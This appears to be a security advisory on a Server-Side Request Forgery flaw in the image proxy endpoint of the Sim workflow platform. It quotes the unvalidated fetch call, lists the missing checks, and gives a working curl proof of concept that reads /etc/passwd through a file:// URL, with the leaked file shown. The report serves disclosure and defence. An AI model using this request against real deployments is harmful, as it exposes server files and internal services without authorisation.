SSRF Vulnerability Analysis Report

commit: fdfa935

This report provides a comprehensive security analysis of a critical Server-Side Request Forgery (SSRF) vulnerability discovered in the Sim workflow automation platform. The vulnerability, located in /app/api/proxy/image/route.ts, allows unauthenticated attackers to make arbitrary HTTP requests to internal network resources and cloud services, potentially leading to complete system compromise.


```bash
git clone https://github.com/simstudioai/sim.git
cd sim/
sudo docker compose -f docker-compose.prod.yml up -d
```

## Vulnerable Code

```javascript
///app/api/proxy/image/route.ts:24-36

  const imageResponse = await fetch(imageUrl, {
    headers: {
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      Accept: 'image/webp,image/avif,image/apng,image/svg+xml,image/*,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      Referer: 'https://sim.ai/',
      'Sec-Fetch-Dest': 'image',
      'Sec-Fetch-Mode': 'no-cors',
      'Sec-Fetch-Site': 'cross-site',
    },
  })
```
  
## Root Cause Analysis

  The fundamental security flaw is the direct and unvalidated use of user-controlled input in a server-side HTTP
  request. The application accepts a url parameter from unauthenticated users and passes it directly to the
  fetch() function without any security validation or sanitization.

  1. No URL Validation: The target URL is taken directly from user input without validation
  2. No Protocol Restrictions: Any protocol (http, https, file, etc.) is accepted
  3. No IP/Hostname Filtering: Internal IP addresses and hostnames are accessible
  4. No Port Restrictions: Any port can be targeted
  5. No Authentication Required: The endpoint is publicly accessible

  Primary Attack Vector: Line 12
  
  const imageUrl = url.searchParams.get('url')

  Complete Control: The attacker has full control over:
  - Target URL (imageUrl)
  - HTTP headers (through the fixed headers)
  - Request method (GET only, but sufficient for SSRF)

  Attack Flow Analysis

  User Input → GET /api/proxy/image?url={target} → Direct fetch(imageUrl) → Response Proxy



```bash
curl "http://IP:3000/api/proxy/image?url=file:///etc/passwd"

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bun:x:1000:1000:Linux User,,,:/home/bun:/bin/sh
```